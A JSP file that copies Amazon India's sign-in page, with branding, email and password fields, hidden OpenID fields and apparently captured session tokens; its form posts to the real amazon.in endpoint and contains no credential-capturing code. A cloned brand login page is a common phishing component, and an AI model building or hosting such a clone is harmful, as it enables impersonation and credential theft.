<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
	pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>
	<div class="a-section a-padding-medium auth-workflow">
		<div class="a-section a-spacing-none">
			<div class="a-section a-spacing-medium a-text-center">
				<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
					<i class="a-icon a-icon-logo" aria-label="Amazon"><span
						class="a-icon-alt">Amazon</span></i> <i
					class="a-icon a-icon-domain-in a-icon-domain"></i>
				</a>
			</div>
		</div>
		<div class="a-section">
			<div id="auth-cookie-warning-message"
				class="a-box a-alert a-alert-warning">
				<div class="a-box-inner a-alert-container">
					<h4 class="a-alert-heading">Please Enable Cookies to Continue</h4>
					<i class="a-icon a-icon-alert"></i>
					<div class="a-alert-content">
						<p>
							<a class="a-link-normal"
								href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">

							</a> about cookies and how to enable them.
						</p>
					</div>
				</div>
			</div>


		</div>

		<div class="a-section">
			<!-- show a warning modal dialog when the third party account is connected with Amazon -->
			<div class="a-section a-spacing-base auth-pagelet-container">
				<div class="a-section">
					<form name="signIn" method="post" novalidate=""
						action="https://www.amazon.in/ap/signin"
						class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
						<input name="appActionToken"
							value="pQ6jyEgQ3utHir8PqReMgBEAXMsj3D" type="hidden"><input
							name="appAction" value="SIGNIN" type="hidden"> <input
							name="openid.pape.max_auth_age" value="ape:MA==" type="hidden">
						<input name="openid.return_to"
							value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmluL2dwL3lvdXJzdG9yZS9ob21lP2llPVVURjgmYWN0aW9uPXNpZ24tb3V0JnBhdGg9JTJGZ3AlMkZ5b3Vyc3RvcmUlMkZob21lJnJlZl89bmF2X3lvdXJhY2NvdW50X3NpZ25vdXQmc2lnbkluPTEmdXNlUmVkaXJlY3RPblN1Y2Nlc3M9MQ=="
							type="hidden"> <input name="prevRID"
							value="ape:NVpDTlE3UkRTVFBHRVkzWTBSWVA=" type="hidden"> <input
							name="openid.identity"
							value="ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q="
							type="hidden"> <input name="openid.assoc_handle"
							value="ape:aW5mbGV4" type="hidden"> <input
							name="openid.mode" value="ape:Y2hlY2tpZF9zZXR1cA==" type="hidden">
						<input name="openid.ns.pape"
							value="ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA=="
							type="hidden"> <input name="openid.claimed_id"
							value="ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q="
							type="hidden"> <input name="pageId" value="ape:aW5mbGV4"
							type="hidden"> <input name="openid.ns"
							value="ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA="
							type="hidden">
						<div class="a-section">
							<div class="a-box">
								<div class="a-box-inner a-padding-extra-large">
									<h1 class="a-spacing-small">Login</h1>
									<!-- optional subheading element -->
									<div class="a-row a-spacing-base">
										<label for="ap_email"> Email or mobile phone number </label> <input
											maxlength="128" id="ap_email" name="email" tabindex="1"
											class="a-input-text a-span12 auth-autofocus auth-required-field"
											type="email">
										<div id="auth-email-missing-alert"
											class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-none a-spacing-top-mini">
											<div class="a-box-inner a-alert-container">
												<i class="a-icon a-icon-alert"></i>
												<div class="a-alert-content">Enter your email or
													mobile phone number</div>
											</div>
										</div>
									</div>
									<input name="create" value="0" type="hidden">
									<div class="a-section a-spacing-large">
										<div class="a-row">
											<div class="a-column a-span5">
												<label for="ap_password"> Password </label>
											</div>
											<div class="a-column a-span7 a-text-right a-span-last">
												<a id="auth-fpp-link-bottom"
													class="a-spacing-null a-link-normal"
													href="https://www.amazon.in/ap/forgotpassword?openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_youraccount_signout%26signIn%3D1%26useRedirectOnSuccess%3D1&amp;prevRID=5ZCNQ7RDSTPGEY3Y0RYP&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=inflex&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=inflex&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
													Forgot Password </a>
											</div>
										</div>
										<input id="ap_password" name="password" tabindex="2"
											class="a-input-text a-span12 auth-required-field"
											type="password">
										<div id="auth-password-missing-alert"
											class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-none a-spacing-top-mini">
											<div class="a-box-inner a-alert-container">
												<i class="a-icon a-icon-alert"></i>
												<div class="a-alert-content">Enter your password</div>
											</div>
										</div>
									</div>
									<div class="a-section a-spacing-extra-large">
										<span id="a-autoid-0"
											class="a-button a-button-span12 a-button-primary"><span
											class="a-button-inner"><input
												aria-labelledby="a-autoid-0-announce" id="signInSubmit"
												tabindex="5" class="a-button-input" type="submit"><span
												id="a-autoid-0-announce" class="a-button-text"
												aria-hidden="true"> Login </span></span></span>
										<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>
										<script type="text/javascript">cf()</script>
									</div>
									<div class="a-divider a-divider-break">
										<h5>New to Amazon?</h5>
									</div>
									<span id="auth-create-account-link"
										class="a-button a-button-span12"><span
										class="a-button-inner"><a id="createAccountSubmit"
											tabindex="6"
											href="https://www.amazon.in/ap/register?openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_youraccount_signout%26signIn%3D1%26useRedirectOnSuccess%3D1&amp;prevRID=5ZCNQ7RDSTPGEY3Y0RYP&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=inflex&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=inflex&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
											class="a-button-text" role="button"> Create your Amazon
												account </a></span></span>
								</div>
							</div>
						</div>
						<input
							value="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"
							name="metadata1" type="hidden">
					</form>
				</div>
			</div>
		</div>
		<div id="right-2"></div>
		<div class="a-section a-spacing-top-extra-large">
			<div class="a-divider a-divider-section">
				<div class="a-divider-inner"></div>
			</div>
			<div class="a-section a-spacing-small a-text-center a-size-mini">
				<span class="auth-footer-seperator"></span> <a class="a-link-normal"
					target="_blank"
					href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=200545940">
					Conditions of Use </a> <span class="auth-footer-seperator"></span> <a
					class="a-link-normal" target="_blank"
					href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=200534380">
					Privacy Notice </a> <span class="auth-footer-seperator"></span> <a
					class="a-link-normal" target="_blank" href="/help"> Help </a> <span
					class="auth-footer-seperator"></span>

			</div>

			<div class="a-section a-spacing-none a-text-center">
				<span class="a-size-mini a-color-secondary"> © 1996-2016,
					Amazon.com, Inc. or its affiliates </span>
			</div>
		</div>
	</div>
</body>
</html>